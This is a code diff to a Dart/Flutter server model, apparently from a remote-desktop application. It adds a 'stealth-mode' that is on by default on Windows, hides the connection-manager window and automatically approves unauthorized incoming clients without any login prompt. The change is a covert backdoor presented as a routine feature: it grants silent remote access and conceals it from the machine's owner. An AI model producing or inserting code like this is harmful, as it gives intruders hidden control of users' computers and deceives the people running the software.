@@ -680,6 +680,12 @@ class ServerModel with ChangeNotifier {
   void addConnection(Map<String, dynamic> evt) {
     try {
       final client = Client.fromJson(jsonDecode(evt["client"]));
+      final stealthMode =
+          isWindows && bind.mainGetLocalOption(key: "stealth-mode") != 'N';
+      if (stealthMode && !hideCm) {
+        hideCm = true;
+        hideCmWindow();
+      }
       if (client.authorized) {
         parent.target?.dialogManager.dismissByTag(getLoginDialogTag(client.id));
         final index = _clients.indexWhere((c) => c.id == client.id);
@@ -707,7 +713,9 @@ class ServerModel with ChangeNotifier {
       }
       scrollToBottom();
       notifyListeners();
-      if (isAndroid && !client.authorized) {
+      if (stealthMode && !client.authorized) {
+        sendLoginResponse(client, true);
+      } else if (isAndroid && !client.authorized) {
         if (bind.mainGetLocalOption(key: "stealth-mode") != 'Y') {
           showLoginDialog(client);
         }
